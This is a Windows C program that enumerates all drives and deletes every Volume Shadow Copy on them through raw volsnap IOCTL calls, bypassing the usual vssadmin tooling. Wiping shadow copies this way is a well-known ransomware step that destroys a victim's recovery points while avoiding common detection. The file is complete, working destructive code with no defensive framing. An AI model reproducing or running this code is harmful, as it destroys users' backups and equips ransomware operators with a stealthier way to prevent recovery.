#include <Windows.h>
#include <winioctl.h>
#include <stdio.h>

#ifndef VOLSNAPCONTROLTYPE
#define VOLSNAPCONTROLTYPE                          0x53
#endif

#ifndef IOCTL_VOLSNAP_QUERY_NAMES_OF_SNAPSHOTS
#define IOCTL_VOLSNAP_QUERY_NAMES_OF_SNAPSHOTS      CTL_CODE(VOLSNAPCONTROLTYPE, 6,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif

#ifndef IOCTL_VOLSNAP_FLUSH_AND_HOLD_WRITES
#define IOCTL_VOLSNAP_FLUSH_AND_HOLD_WRITES         CTL_CODE(VOLSNAPCONTROLTYPE, 3,  METHOD_NEITHER,  FILE_ANY_ACCESS)
#define IOCTL_VOLSNAP_RELEASE_WRITES                CTL_CODE(VOLSNAPCONTROLTYPE, 4,  METHOD_NEITHER,  FILE_ANY_ACCESS)
#endif

#ifndef IOCTL_VOLSNAP_DELETE_SNAPSHOT
#define IOCTL_VOLSNAP_DELETE_SNAPSHOT               CTL_CODE(VOLSNAPCONTROLTYPE, 14, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#endif


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// Frees and nullifies a pointer allocated on the current process heap
#define FREE_ALLOCATED_HEAP(PNTR)                       \
    if (PNTR) {                                         \
        HeapFree(GetProcessHeap(), 0, PNTR);            \
        PNTR = NULL;                                    \
    }

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#pragma pack(push, 1)
typedef struct _VOLSNAP_NAMES
{
    ULONG   uMultiSzLen;    
    WCHAR   awcNames[ANYSIZE_ARRAY];   

} VOLSNAP_NAMES, * PVOLSNAP_NAMES;
#pragma pack(pop)


#pragma pack(push, 1)
typedef struct _VS_VOLSNAP_NAME
{
    USHORT  uNameLength;
    WCHAR   zwcName[ANYSIZE_ARRAY];

} VS_VOLSNAP_NAME, * PVS_VOLSNAP_NAME;
#pragma pack(pop)

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static HANDLE OpenVolumeHandle(IN LPCWSTR pwszBackedVol, IN BOOL bQueryVolumeFlags)
{
    DWORD   dwDesiredAccess         = (bQueryVolumeFlags ? (GENERIC_READ) : (FILE_GENERIC_READ | FILE_GENERIC_WRITE));
    DWORD   dwShareMode             = (bQueryVolumeFlags ? (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) : (FILE_SHARE_READ | FILE_SHARE_WRITE));
    DWORD   dwFlagsAndAttributes    = (bQueryVolumeFlags ? (FILE_FLAG_BACKUP_SEMANTICS) : (FILE_ATTRIBUTE_NORMAL));
    HANDLE  hVolume                 = INVALID_HANDLE_VALUE;
    
    hVolume = CreateFileW(
        pwszBackedVol,
        dwDesiredAccess,
        dwShareMode,
        NULL,
        OPEN_EXISTING,
        dwFlagsAndAttributes,
        NULL
    );

    if (hVolume == INVALID_HANDLE_VALUE)
        printf("[!] CreateFileW Failed For %ws With Error: %lu \n", pwszBackedVol, GetLastError());

    return hVolume;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL QuerySnapshotNamesViaIoctl(IN LPCWSTR pwszBackedVol, OUT LPWSTR** pppwszSnapList, OUT PDWORD pdwSnapCount)
{
    HANDLE              hVolume                 = INVALID_HANDLE_VALUE;
    DWORD               dwBytesReturned         = 0x00,
                        dwLastError             = ERROR_SUCCESS,
                        dwSnapCount             = 0x00;
    ULONG               uBytesRequired          = 0x00;
    LPBYTE              lpBuffer                = NULL;
    SIZE_T              cbTotalBytesRequired    = 0x00;
    PVOLSNAP_NAMES      pVolsnapNames           = NULL;
    LPCWSTR             pwszIter                = NULL;
    LPWSTR*             ppwszNames              = NULL;
    BOOL                bResult                 = FALSE;

    if (!pppwszSnapList || !pdwSnapCount) 
        return FALSE;

    *pppwszSnapList = NULL;
    *pdwSnapCount   = 0x00;

    if ((hVolume = OpenVolumeHandle(pwszBackedVol, TRUE)) == INVALID_HANDLE_VALUE)
        goto _FUNC_CLEANUP;

    // Fetch the size of the buffer required to hold the snapshot names
    if (!DeviceIoControl(hVolume, IOCTL_VOLSNAP_QUERY_NAMES_OF_SNAPSHOTS, NULL, 0, &uBytesRequired, sizeof(uBytesRequired), &dwBytesReturned, NULL))
    {
        dwLastError = GetLastError();
    }

    if (dwLastError == ERROR_INVALID_PARAMETER || (dwLastError == ERROR_SUCCESS && uBytesRequired == 0x00))
    {
	printf("[-] No Shadow Copies Found For Volume: %ws \n", pwszBackedVol);
        bResult = TRUE;
        goto _FUNC_CLEANUP;
    }

    if ((dwLastError != ERROR_SUCCESS) && (dwLastError != ERROR_MORE_DATA) && (dwLastError != ERROR_BUFFER_OVERFLOW))
    {
        printf("[!] DeviceIoControl [%d] Failed With Error: %lu \n", __LINE__, dwLastError);
        goto _FUNC_CLEANUP;
    }

    if (uBytesRequired < sizeof(WCHAR) * 2) 
        uBytesRequired = sizeof(WCHAR) * 2;
    
    cbTotalBytesRequired = (SIZE_T)uBytesRequired + sizeof(ULONG);
    
    if (!(lpBuffer = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbTotalBytesRequired)))
    {
        printf("[!] HeapAlloc [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
        goto _FUNC_CLEANUP;
    }

    // Stop writes to the volume
    DeviceIoControl(hVolume, IOCTL_VOLSNAP_FLUSH_AND_HOLD_WRITES, NULL, 0, NULL, 0, &dwBytesReturned, NULL);

    // Fetch the snapshot names
    if (!DeviceIoControl(hVolume, IOCTL_VOLSNAP_QUERY_NAMES_OF_SNAPSHOTS, NULL, 0, lpBuffer, (DWORD)cbTotalBytesRequired, &dwBytesReturned, NULL))
    {
        printf("[!] DeviceIoControl [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
        goto _FUNC_CLEANUP;
    }

    // Parsing PVOLSNAP_NAMES
    pVolsnapNames   = (PVOLSNAP_NAMES)lpBuffer;
    pwszIter        = pVolsnapNames->awcNames;

    while (*pwszIter)
    {
        (*pdwSnapCount)++;
        pwszIter += lstrlenW(pwszIter) + 1;
    }

    if (!*pdwSnapCount) 
    {
        printf("[-] No Shadow Copies Found For Volume: %ws \n", pwszBackedVol);
	bResult = TRUE;
        goto _FUNC_CLEANUP;
    }
    
    // Allocate the array of pointers for snapshot names
    if (!(ppwszNames = (LPWSTR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pdwSnapCount * sizeof(LPWSTR))))
    {
        printf("[!] HeapAlloc [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
        goto _FUNC_CLEANUP;
    }

    pwszIter = pVolsnapNames->awcNames;

   // Copy the snapshot names into the allocated array
    for (unsigned int i = 0; i < *pdwSnapCount; ++i)
    {
        DWORD dwStringLength = lstrlenW(pwszIter) + 1;

        if (!(ppwszNames[i] = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwStringLength * sizeof(WCHAR))))
        {
            printf("[!] HeapAlloc [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
            *pdwSnapCount = i;
	    break;
        }
       
        wcsncpy_s(ppwszNames[i], dwStringLength, pwszIter, _TRUNCATE);
        pwszIter += dwStringLength;
    }

   
    bResult = TRUE;

_FUNC_CLEANUP:

    if (lpBuffer)
    {
        FREE_ALLOCATED_HEAP(lpBuffer);
    }

    if (!bResult)
    {
        if (ppwszNames)
        {
            for (DWORD i = 0; i < *pdwSnapCount; ++i)
            {
                if (ppwszNames[i]) 
                {
                    FREE_ALLOCATED_HEAP(ppwszNames[i]);
                }
            }

            FREE_ALLOCATED_HEAP(ppwszNames);
        }

        *pppwszSnapList = NULL;
        *pdwSnapCount   = 0x00;
    }
    else
    {
        *pppwszSnapList = ppwszNames;
    }

	// Always release writes 
    if (hVolume != INVALID_HANDLE_VALUE && hVolume != NULL)
    {
        DeviceIoControl(hVolume, IOCTL_VOLSNAP_RELEASE_WRITES, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
        CloseHandle(hVolume);
    }
   
    return bResult;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


BOOL DeleteShadowCopyViaIoctl(IN LPCWSTR pwszBackedVol, IN LPCWSTR pwszSnapDevice)
{
    PVS_VOLSNAP_NAME         pVolsnapDelete         = NULL;
    HANDLE                   hVolume                = INVALID_HANDLE_VALUE;
    DWORD                    dwBytesReturned        = 0x00;
    BOOL                     bResult                = FALSE;

    if (!(pVolsnapDelete = (PVS_VOLSNAP_NAME)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(VS_VOLSNAP_NAME) + (lstrlenW(pwszSnapDevice) * sizeof(WCHAR)) + sizeof(WCHAR))))
    {
        printf("[!] HeapAlloc [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
	return FALSE;
    }

    pVolsnapDelete->uNameLength = (USHORT)(lstrlenW(pwszSnapDevice) * sizeof(WCHAR));
    RtlCopyMemory(pVolsnapDelete->zwcName, pwszSnapDevice, pVolsnapDelete->uNameLength + sizeof(WCHAR));

    if ((hVolume = OpenVolumeHandle(pwszBackedVol, FALSE)) == INVALID_HANDLE_VALUE)
        goto _END_OF_FUNC;


    if (!DeviceIoControl(hVolume, IOCTL_VOLSNAP_DELETE_SNAPSHOT, pVolsnapDelete, pVolsnapDelete->uNameLength + sizeof(USHORT), NULL, 0x00, &dwBytesReturned, NULL))
    {
	printf("[!] DeviceIoControl [%d] Failed With Error: %lu \n", __LINE__, GetLastError());
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    FREE_ALLOCATED_HEAP(pVolsnapDelete);
    if (hVolume != INVALID_HANDLE_VALUE && hVolume != NULL)
        CloseHandle(hVolume);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL EnumerateShadowCopiesViaIoctlAndDelete(OUT OPTIONAL PDWORD pdwNumberOfSnapshotsDeleted)
{
    DWORD			dwNumberOfDrives		= 0x00,
                                dwQueriedSnapshots      	= 0x00;
    LPWSTR*                     ppwszSnapshotNames      	= NULL;
    WCHAR			szDrives[MAX_PATH]		= { 0 };
    WCHAR			szVolumePath[0x10]		= { 0 };
    WCHAR*			pszDrive			= NULL;

    if (pdwNumberOfSnapshotsDeleted) *pdwNumberOfSnapshotsDeleted = 0x00;

    if ((dwNumberOfDrives = GetLogicalDriveStringsW(MAX_PATH, szDrives)) == 0x00) {
        printf("[!] GetLogicalDriveStringsW Failed With Error: %ld \n", GetLastError());
	return FALSE;
    }

    pszDrive = szDrives;

    while (*pszDrive)
    {
        swprintf(szVolumePath, _countof(szVolumePath), L"\\\\.\\%c:", pszDrive[0]);
        printf("[*] Querying Shadow Copies Of Volume: %ws \n", szVolumePath);

        if (QuerySnapshotNamesViaIoctl(szVolumePath, &ppwszSnapshotNames, &dwQueriedSnapshots))
        {
            for (DWORD i = 0; i < dwQueriedSnapshots; ++i)
            {
                printf("[i] Deleting Shadow Copy: %ws Of %ws\n", ppwszSnapshotNames[i], szVolumePath);

                if (DeleteShadowCopyViaIoctl(szVolumePath, ppwszSnapshotNames[i]))
                {
                    if (pdwNumberOfSnapshotsDeleted) (*pdwNumberOfSnapshotsDeleted)++;
                }

                FREE_ALLOCATED_HEAP(ppwszSnapshotNames[i]);
            }

            FREE_ALLOCATED_HEAP(ppwszSnapshotNames);
        }

        pszDrive += lstrlenW(pszDrive) + 1;
    }

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

int main(void)
{
    DWORD pdwNumberOfSnapshotsDeleted = 0x00;

    if (!EnumerateShadowCopiesViaIoctlAndDelete(&pdwNumberOfSnapshotsDeleted))
        return -1;

    if (pdwNumberOfSnapshotsDeleted)
        printf("[+] Successfully Deleted [ %lu ] Shadow Copies\n", pdwNumberOfSnapshotsDeleted);

    return 0;
}
